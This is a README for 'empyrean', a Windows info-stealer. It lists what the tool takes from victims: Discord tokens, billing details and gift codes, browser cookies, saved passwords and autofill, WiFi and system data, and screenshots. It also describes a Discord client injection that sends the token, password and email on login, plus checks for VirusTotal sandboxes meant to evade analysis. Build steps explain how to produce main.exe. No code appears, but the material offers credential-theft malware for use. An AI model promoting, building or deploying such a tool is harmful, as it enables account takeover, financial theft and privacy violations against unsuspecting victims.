<img src="img/banner.gif" width="100%" height="100%" />

## Features

-   Discord token info
    -   Nitro
    -   Badges
    -   Billing
    -   Email
    -   Phone
    -   HQ Guilds
    -   HQ Friends
    -   Gift codes
-   Browser data
    -   Cookies
    -   Passwords
    -   History
    -   Bookmarks
    -   Autofill
    -   Chrome, Edge, Brave, Opera GX, and many more...
-   Discord Injection
    -   Send token, password, and email on login or when password is changed
-   System info
    -   User
    -   System
    -   Disk
    -   Network
    -   WiFi
    -   Screenshot
-   Anti-debug

    -   Check if being run in a virustotal sandbox


## Install

### Important

-   Windows 10/11
-   [Python](https://www.python.org/downloads/release/python-3109/)
-   [Git](https://git-scm.com/download/win)

### Setup

1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
2. Extract zip
3. Run `install_python.bat` if you don't have python installed
4. Run the builder by double clicking the `build.bat` file
5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`

## Errors?

-   Msg on [Discord](https://discord.com/channels/@me/1288138699032498339/)

